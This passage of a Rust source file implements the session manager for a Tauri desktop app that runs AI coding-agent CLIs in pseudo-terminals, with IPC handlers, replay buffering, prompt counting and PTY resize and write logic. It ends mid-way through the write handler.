//! Agent sessions: IPC handlers and the session manager.
//!
//! A "session" binds a provider (claude-code-cli, codex, gemini-cli, …) to
//! a PTY backed by `portable-pty` (like terminal.rs). The `SessionManager`
//! holds the pool of live sessions, replicates dedup-by-name, prompt
//! counting (with bubble-up to the parent for sub-agents), status and the
//! output stream to the renderer over two `tauri::ipc::Channel`s.
//!
//! IPC channel mapping → Tauri commands (snake_case):
//!   session:create       -> session_create
//!   session:destroy      -> session_destroy
//!   session:list         -> session_list
//!   session:get          -> session_get
//!   session:write        -> session_write
//!   session:resize       -> session_resize
//!   session:rename       -> session_rename
//!   session:update-meta  -> session_update_meta
//!   session:buffer       -> session_buffer
//!   provider:check       -> provider_check
//! Push channels (main→renderer):
//!   session:output  -> InvokeResponseBody::Raw (per-session Channel from session_create/wake)
//!   session:status  -> SessionStatus   (passed as a Channel to session_create)
//!
//! Self-contained: does not touch mod.rs / lib.rs / Cargo.toml. lib.rs only has to
//! `.manage(Arc::new(SessionManager::new()))` and register the commands.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::sync::Arc;
use std::time::{Duration, Instant};

use parking_lot::Mutex;
use portable_pty::{ChildKiller, CommandBuilder, NativePtySystem, PtyPair, PtySize, PtySystem};
use serde::{Deserialize, Serialize};
use serde_json::Value as JsonValue;
use tauri::ipc::{Channel, InvokeResponseBody};
use tauri::Emitter as _;
use uuid::Uuid;

// ─────────────────────────────────────────────────────────────────────────
// Constants — session manager.
// ─────────────────────────────────────────────────────────────────────────

/// MAX_RAW_BYTES: 512 KB of raw output for replay.
const MAX_RAW_BYTES: usize = 512 * 1024;
/// Retry backoff for the local store create: 1s, 3s, 10s.
const STORE_CREATE_RETRY_DELAYS_MS: [u64; 3] = [1000, 3000, 10000];
/// Periodic flush of unsynced prompt counts.
const PROMPT_SYNC_INTERVAL_MS: u64 = 30_000;
/// Preventive reset of xterm "input-reporting" modes, as the FIRST output
/// chunk of EVERY spawn (local and remote): the terminal view is reused across
/// spawns (double buffer) and a dead TUI without DECRST leaves mouse
/// tracking / focus reporting / bracketed paste on — from there every mouse
/// movement becomes INPUT on the bare shell and corrupts the launch line.
/// The alt-screen (?1049) is NOT touched: the cover/seed choreography handles it.
const MODE_RESET_PREAMBLE: &[u8] =
    b"\x1b[?1000l\x1b[?1002l\x1b[?1003l\x1b[?1005l\x1b[?1006l\x1b[?1015l\x1b[?1004l\x1b[?2004l\x1b[?25h";

/// Provider → CLI binary map to look up on PATH (PROVIDER_COMMANDS).
pub(crate) fn provider_command(provider: &str) -> Option<&'static str> {
    match provider {
        "claude-code-cli" => Some("claude"),
        "codex" => Some("codex"),
        "gemini-cli" => Some("gemini"),
        "antigravity" => Some("agy"),
        // Same binaries as subagent::provider_binary: the Copilot CLI is
        // `copilot` (not `gh`, which passed the check without Copilot), Cursor is
        // `cursor-agent` (not the editor).
        "copilot" => Some("copilot"),
        "cursor" => Some("cursor-agent"),
        "grok" => Some("grok"),
        "hermes" => Some("hermes"),
        "opencode" => Some("opencode"),
        "muse" => Some("muse"),
        "promptops-cli" => Some("promptops-cli"),
        _ => None,
    }
}

// ─────────────────────────────────────────────────────────────────────────
// DTO — session types shared with the web UI.
// ─────────────────────────────────────────────────────────────────────────

/// SessionStatus: 'idle' | 'running' | 'waiting_input' | 'completed' | 'error' | 'exited'.
pub type SessionStatus = String;
/// ProviderType (free-form string, validated by the provider-registry/check).
pub type ProviderType = String;

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct WorkspaceBinding {
    pub path: String,
    pub name: String,
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub token_history_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub profile_id: Option<String>,
    /// `Some(Some(id))` = specific account, `Some(None)` = opt-out, `None` = inherit.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provider_account_id: Option<Option<String>>,
    /// Account the last CLI actually started with ("" = no account,
    /// default config). The transcript lives in THAT account's config dir:
    /// if the global active account changes, a resume on the new one would not find it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub launched_provider_account_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
    /// Chosen Windows shell: 'powershell'|'pwsh'|'cmd'|'gitbash'|'wsl:<distro>'.
    /// None = platform default. Ignored off Windows.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub shell: Option<String>,
    /// Remote "command" transport (cwd `cmd://<path>`): connection command
    /// that the local PTY runs and keeps alive — e.g. `ssh user@host`
    /// or `aws ssm start-session --target i-…`. Persisted in config so
    /// wake reconnects with the same command.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub remote_command: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub env: Option<HashMap<String, String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cols: Option<u16>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub rows: Option<u16>,
    /// providerOptions: opaque bag (command/args/resume/claudeSessionId/…).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provider_options: Option<JsonValue>,
    /// providerSessionIds: `{ provider: sessionId }` map with the conversation
    /// id of each provider's LAST turn on this session.
    /// Lives inside `config` (already persisted) instead of a new column:
    /// zero migrations, and old builds that don't know it ignore it
    /// without breaking. It is the key to cross-provider resume: the `claude_session_id` column stays the
    /// current provider's id for backward compatibility with readers of that column only.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provider_session_ids: Option<JsonValue>,
    /// extensionSelection: secrets travel only in memory, never persisted.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extension_selection: Option<JsonValue>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub auto_approve: Option<bool>,
}

/// SessionViewState — per-session layout (the known fields).
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionViewState {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sidebar_collapsed: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sub_agents_height: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sub_agents_list_mode: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sub_agent_tab_mode: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sub_agent_grid_mode: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user_explicit_layout: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ide_sub_agents_height: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub action_center_width: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub action_center_collapsed: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ide_right_width: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ide_right_collapsed: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub locked_sub_agent_ids: Option<Vec<String>>,
}

/// SessionEvent — history log entry.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct SessionEvent {
    pub timestamp: String,
    #[serde(rename = "type")]
    pub event_type: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub data: Option<JsonValue>,
}

/// CreateSessionRequest — session:create payload.
#[derive(Clone, Debug, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CreateSessionRequest {
    #[serde(default)]
    pub name: Option<String>,
    pub provider: ProviderType,
    #[serde(default)]
    pub config: Option<SessionConfig>,
    #[serde(default)]
    pub workspace_id: Option<Option<String>>,
    /// _skipApiCreate — skips the fire-and-forget POST (used in restore).
    #[serde(default, rename = "_skipApiCreate")]
    pub skip_api_create: bool,
    /// parentSessionId — marks this session as a sub-agent of a parent.
    #[serde(default)]
    pub parent_session_id: Option<String>,
}

/// SessionSummary — DTO returned to list/create/get.
#[derive(Clone, Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionSummary {
    pub id: String,
    pub name: String,
    pub provider: ProviderType,
    pub status: SessionStatus,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub workspace: Option<WorkspaceBinding>,
    pub workspace_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub claude_session_id: Option<String>,
    pub created_at: String,
    pub pending_interaction_count: usize,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub view_state: Option<SessionViewState>,
    /// ISO time it went on standby; None = active session.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub standby_at: Option<String>,
    /// Stored record id (`dbId` in the summary): it is the stable
    /// cross-run identity the renderer uses for sub-agent stash, bench and
    /// TODO list — the name is NOT (a new session reusing the name of a
    /// deleted one must not inherit anything from it). Known only to the manager, so
    /// it is attached by whoever holds `db_ids`, via `with_db_id`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub db_id: Option<String>,
    /// session_wake only: Some(true) = new PTY, Some(false) = no-op wake
    /// (already awake or lead closed). The bridge does NOT rebind the channel
    /// on no-ops: the rebind reset the offset counter and the terminal replay
    /// dropped the live output (invisible shell prompt).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub respawned: Option<bool>,
}

/// ProviderCheckResult — result of provider:check.
#[derive(Clone, Debug, Serialize)]
pub struct ProviderCheckResult {
    pub installed: bool,
    pub platform: String,
    pub command: String,
    pub provider: String,
}

// session:output travels as `InvokeResponseBody::Raw` on the per-session
// Channel (same contract as terminal.rs): no JSON envelope and no
// base64 — the bridge binds the chunk to the session via `_bind(id)`.

/// Payload pushed on session:status ('session:status-changed').
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionStatusChange {
    pub session_id: String,
    pub old_status: SessionStatus,
    pub new_status: SessionStatus,
}

/// Generic { ok, error } outcomes returned by the handlers.
#[derive(Serialize)]
pub struct OkResult {
    pub ok: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}
impl OkResult {
    fn ok() -> Self {
        Self {
            ok: true,
            error: None,
        }
    }
    fn err(msg: impl Into<String>) -> Self {
        Self {
            ok: false,
            error: Some(msg.into()),
        }
    }
}

/// session:create outcome — { ok, session? , error? }.
#[derive(Serialize)]
pub struct CreateResult {
    pub ok: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub session: Option<SessionSummary>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

// ─────────────────────────────────────────────────────────────────────────
// Internal session state.
// ─────────────────────────────────────────────────────────────────────────

/// Raw replay buffer, contiguous and capped at MAX_RAW_BYTES (same pattern
/// as ReplayBuf in terminal.rs). Truncation happens at an arbitrary byte offset:
/// `raw()` uses from_utf8_lossy, so a split char at the head degrades to
/// U+FFFD without corrupting the replay (PTY read boundaries were arbitrary
/// before as well).
struct OutputBuffer {
    data: Vec<u8>,
    /// Total bytes seen since the PTY spawn (= endOffset of the replay
    /// contract, like ReplayBuf.total in terminal.rs): the bridge uses it to
    /// byte-precisely dedup the replay against the live stream on attach.
    total: usize,
    /// Host-side emulated screen (term_state), fed the same bytes under the
    /// same lock: snapshot and endOffset are always consistent.
    vt: crate::commands::term_state::TermState,
}

impl OutputBuffer {
    fn new(cols: u16, rows: u16) -> Self {
        Self {
            data: Vec::new(),
            total: 0,
            vt: crate::commands::term_state::TermState::new(cols, rows),
        }
    }

    /// handleOutput: accumulates the raw chunk, dropping the head beyond the cap.
    fn push(&mut self, data: &[u8]) {
        self.vt.feed(data);
        self.data.extend_from_slice(data);
        self.total += data.len();
        if self.data.len() > MAX_RAW_BYTES {
            let cut = self.data.len() - MAX_RAW_BYTES;
            self.data.drain(..cut);
        }
    }

    /// getRawBuffer.
    fn raw(&self) -> String {
        String::from_utf8_lossy(&self.data).into_owned()
    }

    /// Screen saved on park and on disk: with VT replay it is the snapshot of
    /// the host screen (exact, a fraction of the bytes), otherwise the raw tail.
    /// It stays ANSI text in both cases: readers do not change.
    fn park_picture(&mut self) -> String {
        if crate::commands::term_state::vt_replay_enabled() && self.total > 0 {
            String::from_utf8_lossy(&self.vt.snapshot()).into_owned()
        } else {
            self.raw()
        }
    }

    fn len(&self) -> usize {
        self.data.len()
    }

    /// Tail of the buffer from `from` onward (for inject_when_ready's
    /// incremental polls: no copy of the whole replay on every round).
    fn slice_from(&self, from: usize) -> String {
        String::from_utf8_lossy(&self.data[from.min(self.data.len())..]).into_owned()
    }
}

/// Live state of a session (AgentSession).
struct AgentSession {
    id: String,
    name: String,
    provider: ProviderType,
    status: SessionStatus,
    config: SessionConfig,
    workspace: Option<WorkspaceBinding>,
    workspace_id: Option<String>,
    claude_session_id: Option<String>,
    parent_session_id: Option<String>,
    created_at: String,
    updated_at: String,
    history: Vec<SessionEvent>,
    pending_interactions: Vec<String>,
    view_state: Option<SessionViewState>,
    /// terminalId == session id (1:1 with the PTY); None if not spawned.
    has_terminal: bool,
    /// PTY backing — `None` for sessions in error (failed spawn).
    pty: Option<SessionPty>,
    /// ISO time it went on standby (parked); None = active.
    standby_at: Option<String>,
    /// Buffer saved at park (in-memory stand-in for the on-disk BufferStore):
    /// serves the session:buffer replay while the session is parked.
    parked_buffer: Option<String>,
}

/// Session terminal backing: local PTY (portable-pty) or remote SSH shell
/// channel (cwd `ssh://…`, see commands/remote.rs). Only resize
/// differs per transport — write and kill go through SessionPty's generic
/// writers/killers, identical in both cases.
enum PtyBacking {
    Local(PtyPair),
    Remote(crate::commands::remote::RemoteShellCtl),
    /// PTY owned by termd (key = the session's dbId).
    Termd(String),
}

/// PTY of a session + buffer. Mirror of Terminal in terminal.rs but with a
/// replay buffer (sessions have getSessionBuffer).
struct SessionPty {
    backing: PtyBacking,
    /// Writer behind its own mutex: writes happen OUTSIDE the state
    /// lock, so a blocked write (full tty queue) does not freeze manager and UI.
    writer: Arc<Mutex<Box<dyn Write + Send>>>,
    buffer: Arc<Mutex<OutputBuffer>>,
    /// Epoch-ms of the last PTY output (activity signal for auto-standby).
    last_output_ms: Arc<std::sync::atomic::AtomicU64>,
    /// Child process killer (clone_killer): explicit kill on
    /// destroy/standby for providers that ignore the SIGHUP from closing the
    /// master. The reap (wait) is done by the reader thread at EOF.
    killer: Mutex<Box<dyn ChildKiller + Send + Sync>>,
}

/// Session PTY teardown: explicit kill of the child, then drop (closes
/// master/writer → SIGHUP to the foreground group for processes still alive).
fn kill_pty(pty: SessionPty) {
    let _ = pty.killer.lock().kill();
    drop(pty);
}

impl AgentSession {
    fn to_summary(&self) -> SessionSummary {
        SessionSummary {
            id: self.id.clone(),
            name: self.name.clone(),
            provider: self.provider.clone(),
            status: self.status.clone(),
            workspace: self.workspace.clone(),
            workspace_id: self.workspace_id.clone(),
            claude_session_id: self.claude_session_id.clone(),
            created_at: self.created_at.clone(),
            pending_interaction_count: self.pending_interactions.len(),
            view_state: self.view_state.clone(),
            standby_at: self.standby_at.clone(),
            db_id: None,
            respawned: None,
        }
    }
}

impl SessionSummary {
    /// Attaches the stored record id (dbId) (lives in `SessionState::db_ids`, not in the session).
    fn with_db_id(mut self, db_id: Option<String>) -> Self {
        self.db_id = db_id;
        self
    }

    /// Wake outcome (see `respawned`).
    fn with_respawned(mut self, respawned: bool) -> Self {
        self.respawned = Some(respawned);
        self
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Dialog-answer input.
// Classifies the chunks that answer an open decision dialog without
// Enter: a single ASCII digit (Claude Code numbered menus) or an SGR-1006
// left click (TUIs with mouse reporting).
// ─────────────────────────────────────────────────────────────────────────

const MOTION_BIT: u32 = 32;
const WHEEL_BIT: u32 = 64;

/// True iff the chunk is exactly one ASCII digit (excludes paste/IME).
fn is_single_digit(data: &str) -> bool {
    let mut chars = data.chars();
    matches!((chars.next(), chars.next()), (Some(c), None) if c.is_ascii_digit())
}

/// True iff the chunk contains at least one SGR-1006 left PRESS:
/// ESC [ < Cb ; Cx ; Cy followed by 'M' (press) — 'm' (release) ignored.
/// Cb: low 2 bits = button (0 = left), bit 32 = motion, bit 64 = wheel
/// (wheel codes 64/65 also use 'M', so the bit must be checked).
/// Modifiers (4 shift / 8 meta / 16 ctrl) are tolerated. The legacy X10
/// encoding is not parsed (embedded TUIs all require SGR 1006).
fn contains_sgr_left_click(data: &str) -> bool {
    let bytes = data.as_bytes();
    let mut i = 0;
    while let Some(pos) = data[i..].find("\x1b[<") {
        let mut j = i + pos + 3;
        // Cb ; Cx ; Cy
        let mut fields: [u32; 3] = [0; 3];
        let mut field = 0usize;
        let mut valid = true;
        while j < bytes.len() {
            let b = bytes[j];
            if b.is_ascii_digit() {
                fields[field] = fields[field].saturating_mul(10) + (b - b'0') as u32;
                j += 1;
            } else if b == b';' && field < 2 {
                field += 1;
                j += 1;
            } else {
                break;
            }
        }
        if field != 2 || j >= bytes.len() {
            valid = false;
        }
        if valid && bytes[j] == b'M' {
            let code = fields[0];
            if code & (MOTION_BIT | WHEEL_BIT) == 0 && code & 3 == 0 {
                return true;
            }
        }
        i = i + pos + 3;
    }
    false
}

/// A chunk that answers an open dialog without containing '\r'.
pub fn is_dialog_answer_input(data: &str) -> bool {
    is_single_digit(data) || contains_sgr_left_click(data)
}

// ─────────────────────────────────────────────────────────────────────────
// SessionManager — pool + shared state. All private fields behind a Mutex.
// ─────────────────────────────────────────────────────────────────────────

#[derive(Default)]
struct ManagerState {
    sessions: HashMap<String, AgentSession>,
    /// Maps local session IDs → stored record ids.
    db_ids: HashMap<String, String>,
    /// Prompt counts not yet saved to the local store.
    unsynced_prompt_counts: HashMap<String, u64>,
    /// Sessions awaiting their first save to the local store → retry count.
    pending_store_sync: HashMap<String, u32>,
    /// This device's id (device workspaces and the UI state snapshot).
    api_device_id: Option<String>,
    /// Active session profile (None = Standard).
    active_profile_id: Option<String>,
    /// Status push channel (session_create or session_status_subscribe).
    status_channel: Option<Channel<SessionStatusChange>>,
    /// Sessions renamed in THIS instance since the last successful persist: only
    /// for them does the exit batch carry `name_authoritative`, so the store
    /// recovers a failed rename save but does not accept the stale
    /// name from another instance that renamed nothing.
    renamed_since_persist: std::collections::HashSet<String>,
    /// Sessions closed by the user before their first save to the store
    /// finished: the record that save creates must be deleted, or the closed
    /// session comes back at the next start.
    closed_unsynced: std::collections::HashSet<String>,
    /// Sessions to relaunch at the next wake with a NEW conversation
    /// (no resume): account switch, the transcript stays on the old account.
    fresh_relaunch: std::collections::HashSet<String>,
}

/// Secondary tap on PTY output (remote access): (sessionId, chunk).
pub type OutputTapFn = Arc<dyn Fn(&str, &[u8]) + Send + Sync>;

pub struct SessionManager {
    state: Mutex<ManagerState>,
    /// Guard: has the prompt-count flush syncTimer been started?
    sync_timer_started: std::sync::atomic::AtomicBool,
    /// Optional tap on the output (registered by remote access in lib.rs).
    output_tap: Mutex<Option<OutputTapFn>>,
    /// Boot restore gate: session_list does not answer until the
    /// restore_from_store thread (lib.rs) has finished (or timed out). Without the gate the
    /// renderer's first list arrives BEFORE the restored ones → the store starts
    /// with the stored record ids (dbIds) and subagent:created (parent = local id)
    /// match nothing: sub-agents invisible until a reload.
    boot_restore_gate: (Mutex<bool>, parking_lot::Condvar),
}

impl Default for SessionManager {
    fn default() -> Self {
        Self::new()
    }
}

impl SessionManager {
    pub fn new() -> Self {
        Self {
            state: Mutex::new(ManagerState::default()),
            sync_timer_started: std::sync::atomic::AtomicBool::new(false),
            output_tap: Mutex::new(None),
            boot_restore_gate: (Mutex::new(false), parking_lot::Condvar::new()),
        }
    }

    /// Boot restore done (ok, failed or skipped for missing token):
    /// unblocks waiting session_list calls. Idempotent.
    pub fn mark_boot_restore_done(&self) {
        let (lock, cvar) = &self.boot_restore_gate;
        *lock.lock() = true;
        cvar.notify_all();
    }

    /// Waits for the boot restore gate, with a safety timeout (a store
    /// error or a dead thread must not freeze the session list).
    pub fn wait_boot_restore(&self, timeout: Duration) {
        let (lock, cvar) = &self.boot_restore_gate;
        let mut done = lock.lock();
        if !*done {
            cvar.wait_for(&mut done, timeout);
        }
    }

    /// Registers the tap on PTY output (called once at setup).
    pub fn set_output_tap(&self, tap: OutputTapFn) {
        *self.output_tap.lock() = Some(tap);
    }

    /// syncTimer: periodic flush of prompt counts (PROMPT_SYNC_INTERVAL_MS).
    /// It needs an Arc<Self>, so it cannot be armed in the constructor.
    /// Armed at setup (lib.rs) AND in create_session: lazy arming on
    /// create alone left restored-only runs (restart + wake) WITHOUT a flusher —
    /// counts reached the local store only by piggybacking on status changes.
    pub(crate) fn ensure_sync_timer(self: &Arc<Self>) {
        use std::sync::atomic::Ordering;
        if self
            .sync_timer_started
            .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
            .is_err()
        {
            return; // already started
        }
        let mgr = Arc::clone(self);
        std::thread::spawn(move || loop {
            std::thread::sleep(Duration::from_millis(PROMPT_SYNC_INTERVAL_MS));
            mgr.flush_prompt_counts();
        });
    }

    /// flushPromptCounts — drains every delta with a mapped dbId to the local store.
    /// Runs on the syncTimer thread: calls are blocking and on
    /// failure the delta is re-credited (the counter is reset before
    /// the request). Pub for the quit flow (lib.rs).
    pub fn flush_prompt_counts(&self) {
        let mut updates: Vec<(String, String, u64)> = Vec::new();
        let auth = {
            let mut guard = self.state.lock();
            let pairs: Vec<(String, u64)> = guard
                .unsynced_prompt_counts
                .iter()
                .filter(|(_, &d)| d > 0)
                .map(|(k, &v)| (k.clone(), v))
                .collect();
            for (session_id, delta) in pairs {
                if let Some(db_id) = guard.db_ids.get(&session_id).cloned() {
                    guard.unsynced_prompt_counts.insert(session_id.clone(), 0);
                    updates.push((session_id, db_id, delta));
                }
            }
            AuthSnapshot {
                device_id: guard.api_device_id.clone(),
                profile_id: guard.active_profile_id.clone(),
            }
        };
        for (session_id, db_id, delta) in updates {
            let payload = serde_json::json!({ "terminal_prompt_count_increment": delta });
            if api_update_sync(&auth, &db_id, &payload) {
                eprintln!("[PromptCount] flushed +{delta} → store {db_id}");
            } else {
                // The store did not confirm: re-credit the delta.
                eprintln!("[PromptCount] flush FAILED (+{delta} ri-accreditato a {session_id})");
                let mut guard = self.state.lock();
                *guard.unsynced_prompt_counts.entry(session_id).or_insert(0) += delta;
            }
        }
    }

    /// setApiDeviceId — this device's id, passed to the local store.
    pub fn set_api_device_id(&self, device_id: String) {
        self.state.lock().api_device_id = Some(device_id);
    }

    /// listSessions — all sessions as summaries.
    pub fn list(&self) -> Vec<SessionSummary> {
        let guard = self.state.lock();
        guard
            .sessions
            .values()
            .map(|s| s.to_summary().with_db_id(guard.db_ids.get(&s.id).cloned()))
            .collect()
    }

    /// getSession → summary (handlers return the summary, not the internal AgentSession).
    pub(crate) fn get(&self, session_id: &str) -> Option<SessionSummary> {
        let guard = self.state.lock();
        guard.sessions.get(session_id).map(|s| {
            s.to_summary()
                .with_db_id(guard.db_ids.get(session_id).cloned())
        })
    }

    pub(crate) fn token_history_id(&self, session_id: &str) -> Option<String> {
        let guard = self.state.lock();
        guard
            .sessions
            .get(session_id)
            .and_then(|s| s.config.token_history_id.clone())
    }

    /// What is needed to resolve the model in use: (provider, cwd, provider
    /// conversation id). Copied under lock and nothing more — reading the
    /// log happens outside, on a blocking thread.
    pub(crate) fn model_lookup(
        &self,
        session_id: &str,
    ) -> Option<(
        String,
        Option<String>,
        Option<String>,
        Option<Option<String>>,
    )> {
        self.state.lock().sessions.get(session_id).map(|s| {
            (
                s.provider.clone(),
                s.config.cwd.clone(),
                s.claude_session_id.clone(),
                s.config.provider_account_id.clone(),
            )
        })
    }

    /// getSessionBuffer — raw PTY output for replay + endOffset (total bytes
    /// seen by the live PTY; 0 for parked/restored, where there is no
    /// live stream to dedup against). Falls back to "" if empty.
    pub fn buffer(&self, session_id: &str) -> Result<(String, u64), String> {
        self.buffer_bytes(session_id)
            .map(|(bytes, offset)| (String::from_utf8_lossy(&bytes).into_owned(), offset))
    }

    // IPC replay must preserve partial UTF-8 characters and original byte offsets.
    fn buffer_bytes(&self, session_id: &str) -> Result<(Vec<u8>, u64), String> {
        let guard = self.state.lock();
        let session = guard
            .sessions
            .get(session_id)
            .ok_or_else(|| format!("Session not found: {session_id}"))?;
        if !session.has_terminal {
            // Parked/restored: return the buffer saved at park, so the view
            // is not a blank screen (same as the standby buffer load).
            return Ok((
                session
                    .parked_buffer
                    .clone()
                    .unwrap_or_default()
                    .into_bytes(),
                0,
            ));
        }
        let live = session.pty.as_ref().map(|p| {
            let buf = p.buffer.lock();
            (buf.data.clone(), buf.total as u64)
        });
        match live {
            Some((raw, total)) if !raw.is_empty() => Ok((raw, total)),
            _ => Ok((
                session
                    .parked_buffer
                    .clone()
                    .unwrap_or_default()
                    .into_bytes(),
                0,
            )),
        }
    }

    /// Replay for the renderer (session_buffer). With VT replay on, the
    /// bytes are a snapshot of the host screen (term_state) instead of the raw
    /// tail: same [endOffset][bytes] contract, nothing changes downstream.
    /// Snapshot taken outside the state lock (up to ~10 ms on full screens).
    fn replay_payload(&self, session_id: &str) -> Result<Vec<u8>, String> {
        let raw = |(bytes, end_offset): (Vec<u8>, u64)| {
            let mut payload = Vec::with_capacity(8 + bytes.len());
            payload.extend_from_slice(&end_offset.to_le_bytes());
            payload.extend_from_slice(&bytes);
            payload
        };
        if !crate::commands::term_state::vt_replay_enabled() {
            return self.buffer_bytes(session_id).map(raw);
        }
        let live = {
            let guard = self.state.lock();
            let session = guard
                .sessions
                .get(session_id)
                .ok_or_else(|| format!("Session not found: {session_id}"))?;
            session
                .pty
                .as_ref()
                .filter(|_| session.has_terminal)
                .map(|p| p.buffer.clone())
        };
        let Some(buffer) = live else {
            return self.buffer_bytes(session_id).map(raw);
        };
        let mut buf = buffer.lock();
        if buf.total == 0 {
            drop(buf);
            return self.buffer_bytes(session_id).map(raw);
        }
        Ok(crate::commands::term_state::vt_replay_payload(&mut buf.vt))
    }

    /// renameSession — rename + local store sync (best-effort).
    fn rename(&self, session_id: &str, new_name: &str) {
        let resolved = self
            .resolve_local_id(session_id)
            .unwrap_or_else(|| session_id.to_string());
        let session_id = resolved.as_str();
        let db_id = {
            let mut guard = self.state.lock();
            let Some(session) = guard.sessions.get_mut(session_id) else {
                return;
            };
            session.name = new_name.to_string();
            session.updated_at = now_iso();
            guard.renamed_since_persist.insert(session_id.to_string());
            guard.db_ids.get(session_id).cloned()
        };
        if let Some(db_id) = db_id {
            // Fire-and-forget: api_update queues on the sync worker, never
            // blocking (session_rename is a sync command on the main thread).
            let auth = self.snapshot_auth();
            api_update(&auth, &db_id, serde_json::json!({ "name": new_name }));
        }
    }

    /// updateSessionMeta — name / workspaceId / viewState / providerAccountId.
    /// Includes the workspace-first guard (here the flags are OFF by
    /// default as in production, see getWorkspaceFirstFlags).
    fn update_meta(&self, session_id: &str, updates: &UpdateMeta) {
        // The renderer may pass the dbId (restored/woken sessions): without
        // resolving it, the rename from the "edit" modal was a local no-op and
        // the persist on exit brought back the old name.
        let resolved = self
            .resolve_local_id(session_id)
            .unwrap_or_else(|| session_id.to_string());
        let session_id = resolved.as_str();
        let mut guard = self.state.lock();
        let Some(session) = guard.sessions.get_mut(session_id) else {
            return;
        };
        let renamed = updates.name.as_ref().is_some_and(|n| *n != session.name);
        if let Some(name) = &updates.name {
            session.name = name.clone();
        }
        if let Some(ws) = &updates.workspace_id {
            // flags.enforcement OFF by default → we always apply.
            // TODO: when WORKSPACE_FIRST_ENFORCEMENT=true, reject the
            // mutation on an already bound session and emit 'session:meta-rejected'.
            session.workspace_id = ws.clone();
        }
        if let Some(vs) = &updates.view_state {
            // Shallow merge ({ ...old, ...new }).
            session.view_state = Some(merge_view_state(session.view_state.clone(), vs.clone()));
        }
        if let Some(pa) = &updates.provider_account_id {
            session.config.provider_account_id = Some(pa.clone());
        }
        if let Some(shell) = &updates.shell {
            // Config updated right away, effect on the next
            // spawn/wake — the live PTY is not touched.
            session.config.shell = shell.clone();
        }
        session.updated_at = now_iso();
        if renamed {
            guard.renamed_since_persist.insert(session_id.to_string());
        }
    }

    /// resizeSession — resizes the PTY.
    pub fn resize(&self, session_id: &str, cols: u16, rows: u16) -> Result<(), String> {
        let guard = self.state.lock();
        let session = guard
            .sessions
            .get(session_id)
            .ok_or_else(|| format!("Session not found: {session_id}"))?;
        if !session.has_terminal {
            return Err(format!("Session {session_id} has no terminal"));
        }
        if let Some(pty) = &session.pty {
            match &pty.backing {
                PtyBacking::Local(pair) => pair
                    .master
                    .resize(PtySize {
                        rows,
                        cols,
                        pixel_width: 0,
                        pixel_height: 0,
                    })
                    .map_err(|e| e.to_string())?,
                PtyBacking::Remote(ctl) => ctl.resize(cols, rows),
                PtyBacking::Termd(key) => crate::commands::termd_link::resize(key, cols, rows),
            }
            // The host screen follows the PTY: output from here on is for the new grid.
            if cols > 0 && rows > 0 {
                pty.buffer.lock().vt.resize(cols, rows);
            }
        }
        Ok(())
    }

    /// writeToSession — writes to the PTY stdin + prompt counting + expires
    /// pending interactions on Enter (\r) during waiting_input.
    ///
    /// `count_prompt=false` lets callers re-send a "swallowed" Enter
    /// (sub-agent submit retry) or inject answers already
    /// credited elsewhere (auto-approve tailer, interaction overlay) without
    /// counting the same turn twice.
    pub fn write(&self, session_id: &str, data: &str, count_prompt: bool) -> Result<(), String> {
        let mut guard = self.state.lock();
        // Check existence/terminal before mutating.
        {
            let session = guard
                .sessions
                .get(session_id)
                .ok_or_else(|| format!("Session not found: {session_id}"))?;
            if !session.has_terminal {
                return Err(format!("Session {session_id} has no terminal"));
            }
        }

        let was_waiting = guard
            .sessions
            .get(session_id)
            .map(|s| s.status == "waiting_input")
            .unwrap_or(false);

        // Count user prompt submissions. Enter (\r) always counts; with a
